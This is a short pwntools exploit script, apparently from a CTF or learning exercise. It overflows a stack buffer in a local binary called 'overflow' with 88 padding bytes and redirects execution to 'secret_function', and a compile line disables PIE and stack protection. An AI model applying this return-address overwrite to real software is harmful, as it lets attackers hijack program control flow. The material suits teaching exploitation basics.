#!/usr/bin/env python3

from pwn import *
import struct

bin_file = './overflow'
payload_file = './payload.bin'

binf = ELF(bin_file)

def main():
    payload = b'A' * 88
    payload += struct.pack('<Q', binf.functions['secret_function'].address)

    # バイナリとしてファイルに保存
    with open(payload_file, 'wb') as f:
        f.write(payload)

    # argv[1] には「ファイル名」を渡す
    conn = process([bin_file, payload_file])

    print(conn.recvall(timeout=2))

if __name__ == '__main__':
    main()


gcc -o overflow overflow.c -fno-PIE -no-pie -fno-stack-protector -g
